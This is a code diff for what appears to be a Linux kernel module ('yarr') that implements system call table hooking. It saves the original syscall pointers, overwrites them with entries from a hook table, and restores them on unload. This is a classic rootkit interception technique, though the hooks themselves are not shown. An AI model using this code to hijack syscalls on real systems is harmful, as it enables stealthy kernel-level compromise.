@@ -26,17 +26,30 @@
 #include "interrupt.h"
 #include "types.h"
 #include "syscall.h"
+#include "syscallhooks.h"
 
 #define CALL_OPCODE (0x008514ff)
 
 unsigned long **real_sys_call_table = NULL;
 unsigned long *fake_sys_call_table[NR_syscalls];
+void *sys_call_table_backup[NR_syscalls];
 
-// TODO: Implement.
 int hookEachSyscall() {
 	int res = -1;
+	int i;
 
-	debug("hookEachSyscall() not yet implemented.\n");
+	// TODO: What about concurrency? Should this code be a critical region?.
+
+	// Substitute the syscalls with our syscalls. Also save the original
+	// pointers so this can be undo when unloading yarr.
+	real_sys_call_table = getSyscallTable();
+	for (i=0; i<NR_syscalls; i++) {
+		sys_call_table_backup[i] = real_sys_call_table[i];
+		if (syscalls_hooks[i] != NULL)
+			kmemcpy(real_sys_call_table+i, syscalls_hooks+i, sizeof(void *));
+	}
+
+	res = 0;
 	return res;
 }
 
@@ -72,15 +85,17 @@ int hookSystemCall() {
 	return res;
 }
 
-// TODO: Implement.
 int unhookEachSyscall() {
 	int res = -1;
+	int i;
 
-	debug("unhookEachSyscall() not yet implemented.\n");
+	for (i=0; i<NR_syscalls; i++)
+		kmemcpy(real_sys_call_table+i, sys_call_table_backup+i, sizeof(void *));
+
+	res = 0;
 	return res;
 }
 
-// TODO: Implement.
 int unpatchSystemCall() {
 	unsigned long *system_call;
 	void *call_instr;
